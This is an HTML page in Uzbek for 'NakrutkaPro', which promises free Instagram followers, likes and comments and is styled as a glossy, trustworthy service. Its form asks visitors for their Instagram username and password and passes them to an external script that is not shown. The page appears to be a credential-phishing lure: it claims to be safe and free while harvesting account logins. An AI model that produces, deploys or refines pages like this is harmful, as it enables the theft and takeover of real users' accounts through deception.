<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">`
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NakrutkaPro - Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script defer src="script.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #7c3aed 0%, #db2777 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', sans-serif;
            margin: 0;
        }
        .glass-card {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
    </style>
</head>
<body class="p-4">

    <div class="w-full max-w-md glass-card rounded-[40px] p-8 shadow-2xl text-white">
        
        <div class="flex flex-col items-center mb-8">
            <div class="bg-gradient-to-br from-purple-500 to-pink-500 p-4 rounded-2xl shadow-lg mb-4 animate-bounce">
                <i class="fas fa-rocket text-3xl"></i>
            </div>
            <h1 class="text-3xl font-bold tracking-tight">NakrutkaPro</h1>
            <h2 class="text-4xl font-extrabold mt-4 text-center leading-tight">Instagram Xizmati</h2>
            <p class="text-white/80 mt-2 text-center font-medium text-sm">
                Tezkor, xavfsiz va mutlaqo bepul! âœ¨
            </p>
        </div>

        <div class="space-y-4">
            <div class="relative">
                <span class="absolute inset-y-0 left-4 flex items-center text-gray-400">
                    <i class="far fa-user"></i>
                </span>
                <input type="text" id="instaUser" placeholder="Foydalanuvchi nomi" 
                    class="w-full py-4 pl-12 pr-4 rounded-2xl bg-white text-gray-800 focus:ring-4 focus:ring-purple-300 outline-none transition-all">
            </div>

            <div class="relative">
                <span class="absolute inset-y-0 left-4 flex items-center text-gray-400">
                    <i class="fas fa-lock"></i>
                </span>
                <input type="password" id="instaPass" placeholder="Parol" 
                    class="w-full py-4 pl-12 pr-4 rounded-2xl bg-white text-gray-800 focus:ring-4 focus:ring-purple-300 outline-none transition-all">
            </div>
        </div>

        <button id="submitBtn"
            class="w-full mt-8 py-4 bg-gradient-to-r from-purple-600 to-pink-500 rounded-2xl font-bold text-lg hover:scale-[1.02] active:scale-95 transition-all shadow-xl flex items-center justify-center gap-2">
            <span id="btnText">Nakrutka olish</span>
            <i class="fas fa-bolt" id="btnIcon"></i>
        </button>

        <div class="grid grid-cols-3 gap-3 mt-8 text-[10px] text-center font-bold">
            <div class="bg-white/10 p-3 rounded-2xl border border-white/10 hover:bg-white/20 transition-all cursor-default">
                <i class="fas fa-users mb-1 text-base"></i><br>OBUNACHI
            </div>
            <div class="bg-white/10 p-3 rounded-2xl border border-white/10 hover:bg-white/20 transition-all cursor-default">
                <i class="far fa-heart mb-1 text-base"></i><br>LAYKLAR
            </div>
            <div class="bg-white/10 p-3 rounded-2xl border border-white/10 hover:bg-white/20 transition-all cursor-default">
                <i class="far fa-comment mb-1 text-base"></i><br>IZOHLAR
            </div>
        </div>
        


        <div class="mt-8 space-y-3">
            <div class="flex items-center gap-3 text-sm font-medium">
                <div class="w-6 h-6 rounded-full border-2 border-cyan-400 flex items-center justify-center">
                    <i class="fas fa-check text-[10px] text-cyan-400"></i>
                </div>
                Tez natija
            </div>
            <div class="flex items-center gap-3 text-sm font-medium">
                <div class="w-6 h-6 rounded-full border-2 border-cyan-400 flex items-center justify-center">
                    <i class="fas fa-shield-alt text-[10px] text-cyan-400"></i>
                </div>
                Xavfsiz xizmat
            </div>
            <div class="flex items-center gap-3 text-sm font-medium">
                <div class="w-6 h-6 rounded-full border-2 border-cyan-400 flex items-center justify-center">
                    <i class="far fa-clock text-[10px] text-cyan-400"></i>
                </div>
                24/7 qo'llab-quvvatlash
            </div>
        </div>

    </div>
    

</body>
</html>
